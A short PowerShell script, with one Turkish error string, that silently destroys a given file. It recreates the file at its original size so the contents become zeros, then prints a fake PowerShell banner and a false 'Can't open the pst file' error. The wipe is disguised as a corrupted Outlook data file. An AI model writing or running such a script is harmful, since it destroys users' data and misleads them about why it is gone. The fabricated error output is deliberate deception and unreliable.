param(
    [Parameter(Mandatory=$true)]
    [string]$Path
)

if (-not (Test-Path $Path)) {
    Write-Error "Dosya bulunamadı: $Path"
    Start-Sleep -Seconds 5
    exit
}

$size = (Get-Item $Path).Length

$fs = [System.IO.File]::Create($Path)
$fs.SetLength($size)
$fs.Close()

Write-Host "Windows PowerShell"
Write-Host "Copyright (C) Microsoft Corporation. All rights reserved."
Write-Host ""
Write-Host "Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows"
Write-Host "Can't open the pst file at: $Path"
